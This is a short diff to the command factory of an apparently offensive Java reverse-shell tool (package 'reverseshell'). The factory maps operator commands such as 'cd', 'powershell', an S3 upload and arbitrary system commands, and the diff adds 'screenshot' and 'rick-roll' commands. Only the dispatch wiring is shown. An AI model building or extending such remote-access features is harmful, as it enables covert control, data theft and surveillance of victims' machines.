@@ -1,10 +1,7 @@
 package com.mtattab.reverseshell.service.factory;
 
 import com.mtattab.reverseshell.service.Command;
-import com.mtattab.reverseshell.service.commands.ChangeDirectoryCommand;
-import com.mtattab.reverseshell.service.commands.SystemCommand;
-import com.mtattab.reverseshell.service.commands.TogglePowerShellCommand;
-import com.mtattab.reverseshell.service.commands.UploadToS3Command;
+import com.mtattab.reverseshell.service.commands.*;
 import com.mtattab.reverseshell.util.DataManipulationUtil;
 
 import java.util.ArrayList;
@@ -22,6 +19,10 @@ public class CommandFactory {
         commandsList.put("cd", new ChangeDirectoryCommand());
         commandsList.put("powershell", new TogglePowerShellCommand());
         commandsList.put("upload", new UploadToS3Command());
+        commandsList.put("screenshot", new ScreenShotCommand());
+        commandsList.put("rick-roll", new RickRollCommand());
+
+
 
 // if not found redirect to system command
         return commandsList.get(firstArgument) == null ? new SystemCommand()
